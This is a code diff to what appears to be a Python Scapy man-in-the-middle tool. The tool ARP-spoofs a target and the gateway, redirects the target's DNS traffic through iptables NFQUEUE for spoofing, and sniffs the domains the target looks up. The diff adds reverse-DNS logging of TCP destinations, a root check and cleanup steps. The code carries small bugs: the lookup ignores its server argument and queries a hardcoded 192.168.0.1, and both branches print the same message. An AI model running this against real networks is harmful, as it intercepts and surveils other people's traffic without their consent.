@@ -5,9 +5,25 @@ from time import sleep
 from arptable import ArpTable
 from parser import parse_arguments
 import os
+import sys
 from netfilterqueue import NetfilterQueue
 import pyroute2
 import socket, struct
+
+def reverse_dns(ip, dns_server):
+    ip = '.'.join(reversed(ip.split('.')))
+    query = IP(dst='192.168.0.1')/UDP()/DNS(qd=DNSQR(qname=ip+'.in-addr.arpa.', qtype='PTR'))
+    response = sr1(query, store_unanswered=False, verbose=0, timeout=0.1)
+
+    if not response:
+        return ""
+    dns_section = response[DNS]
+    if dns_section.rcode==3:
+        return "No record found"
+
+    else:
+        return dns_section.an.rdata
+		
 
 #https://stackoverflow.com/a/6556951
 def find_gateway(iface = conf.iface):
@@ -79,12 +95,14 @@ class ArpSpoof(threading.Thread):
         #self.rearp()
 
 
+
 class MITM():
     def __init__ (self, IpList, iface=conf.iface):
         self.IpList = IpList
         self.MacList = tuple(get_macs(IpList))
         self.LocalIp = IP(dst=IpList[1]).src
         self.LocalMac = get_if_hwaddr(iface)
+        self.ModifiedIpTables = False
         self.ArpSpoofThread = ArpSpoof (IpList, self.MacList)
 
     def start_mitm(self):
@@ -99,15 +117,19 @@ class MITM():
             raise RuntimeError ("MITM needed in order to start DNS Spoof")
         if ip is None:
             ip=self.LocalIp
+        
         os.system("iptables -t mangle -A PREROUTING -p udp -s {} --dport 53 -j NFQUEUE --queue-num 1".format(self.IpList[0]))
+        self.ModifiedIpTables = True
         nfqueue = NetfilterQueue()
         nfqueue.bind(1, self._modify(ip))
         nfqueue.run(block=BlockCall)
         
     def clean_exit(self):
-        self.enable_forward(0)
-        os.system("iptables -t mangle -D PREROUTING -p udp -s {} --dport 53 -j NFQUEUE --queue-num 1".format(self.IpList[0]))
+        if self.ModifiedIpTables:
+        	os.system("iptables -t mangle -D PREROUTING -p udp -s {} --dport 53 -j NFQUEUE --queue-num 1".format(self.IpList[0]))
+
         self.ArpSpoofThread.join()
+        self.enable_forward(0)
        
     def _modify(self, ip):
         def modify(packet):
@@ -125,21 +147,37 @@ class MITM():
 
 
 def main():
+    if os.geteuid() != 0:
+        print ("Must be executed as root", file=sys.stderr)
+        exit(1)
     arguments = parse_arguments()
+    gateway = find_gateway()
     IP1 = arguments.target1 #"10.150.0.1"
+    
     if arguments.UseGateway is True:
-        IP2 = find_gateway()
+        IP2 = gateway
     else:
         IP2 = arguments.target2
     print ("IP1: {}\nIP2: {}".format(IP1, IP2))
-    FiltroDNS="udp port 53 and ip src {}".format(IP1)
+    if arguments.RDNS:
+        print ("Using reverse DNS lookup method")
+        FiltroDNS="tcp and ip src {}".format(IP1)
+        processing = lambda x: print("Packetillo: ", reverse_dns(x[IP].dst, gateway))
+    else:
+        print ("Using reverse DNS lookup method")
+        FiltroDNS="udp port 53 and ip src {}".format(IP1)
+        processing = lambda x: print("Intento de acceso a {}".format(str(x.qd.qname, 'utf-8')))
     mitm = MITM((IP1, IP2))
     print ("Mac Addrs = {}".format(mitm.MacList))
     mitm.start_mitm()
+    print ("MITM started")
     try:
         #mitm.start_DNS_spoof(BlockCall=True)
-        print(sniff(store=False, prn=lambda x: print("Intento de acceso a {}".format(str(x.qd.qname, 'utf-8'))), filter=FiltroDNS))
-    except KeyboardInterrupt:
+        print ("Sniffing... Press Ctrl-C to stop.")
+        print (sniff(store=False, prn=processing, filter=FiltroDNS))
+        print ("Sniffing finished.")
+    finally:
+        print ("Cleaning everythin")
         mitm.clean_exit()
 
 
